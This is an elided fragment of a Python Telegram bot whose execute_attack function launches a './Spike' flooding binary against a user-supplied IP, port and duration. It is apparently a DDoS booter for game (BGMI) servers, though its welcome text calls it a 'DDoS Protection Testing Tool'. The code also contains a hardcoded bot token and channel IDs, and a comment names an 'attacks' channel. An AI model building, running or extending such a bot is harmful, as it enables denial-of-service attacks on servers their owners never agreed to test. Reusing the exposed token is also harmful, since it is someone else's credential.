...
TOKEN = '8010124609:AAGRl0zGF1w-Tz8XUDUUyLMz8cI_hS6hxtg'  # Replace with your actual bot token
CHANNEL_ID = '-1002508731704'  # Replace with your specific channel or group ID for attacks
FEEDBACK_CHANNEL_ID = '-1002683395534'  # Replace with your specific channel ID for feedback
message_queue = []


# Official channel details
OFFICIAL_CHANNEL = "@SHUBH_OFFCIAL_TELEGRAM"  # Replace with your channel username or ID
CHANNEL_LINK = "https://t.me/SHUBH_OFFCIAL_TELEGRAM"  # Replace with your channel link
...
def bgmi_command(message):
    ...
    try:
        ...
        support_button.add(InlineKeyboardButton("🙏 Support 🙏", url="https://t.me/SHUBH_OFFCIAL_TELEGRAM"))
...
async def execute_attack(ip, port, duration, username):
    ...
    try:
        ...
        proc = await asyncio.create_subprocess_shell(
            f"./Spike {ip} {port} {duration} 14 900",
...
def send_welcome(message):
    ...
    *_A Powerful DDoS Protection Testing Tool_*
    ...
    🔗 Support: @SHUBH_OFFCIAL_TELEGRAM
    🔰 Owner : @Shubham_Chity
    """
    ...
    markup.add(
        ...
        telebot.types.InlineKeyboardButton("📚 Tutorial", url='https://t.me/SHUBH_OFFCIAL_TELEGRAM')
    )
...
def send_help(message):
    ...
    📌 *Need Help?*
    Contact support: @SHUBH_OFFCIAL_TELEGRAM
    Report issues: @Shubham_Chity
    """
    
    # Add support buttons
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(
        telebot.types.InlineKeyboardButton("🆘 Immediate Support", url='t.me/Shubham_Chity'),
        telebot.types.InlineKeyboardButton("📘 Documentation", url='https://t.me/SHUBH_OFFCIAL_TELEGRAM')
    )
